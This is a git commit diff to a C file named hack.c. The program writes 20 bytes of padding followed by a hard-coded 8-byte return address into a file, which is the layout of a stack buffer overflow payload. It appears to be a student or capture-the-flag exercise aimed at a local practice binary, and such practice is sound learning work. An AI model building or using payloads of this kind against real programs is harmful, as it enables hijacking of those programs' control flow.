4116b19cd8f13a1e6bc2d6bf91b2cadd7a5c4639
RusakovD3 <103295869+RusakovD3@users.noreply.github.com>
2023-12-07 14:10:37 +0700

    Update hack.c

--- hack.c
+++ hack.c
@@ -4,8 +4,8 @@ int main() {
     FILE* file;
     file = fopen("text.bin", "wb");
 
-    char trash[] = "asdasdasdasdasdasdas";
-    char addr[] = {0xae, 0x51, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00}; // 0x00005555555551ae
+    char trash[] = "12345678901234567890";
+    char addr[] = {0xeb, 0x51, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00}; // 0x00005555555551eb
 
     for (unsigned int i = 0; i < 20; i++) {
         fwrite(&trash[i], sizeof(char), 1, file);
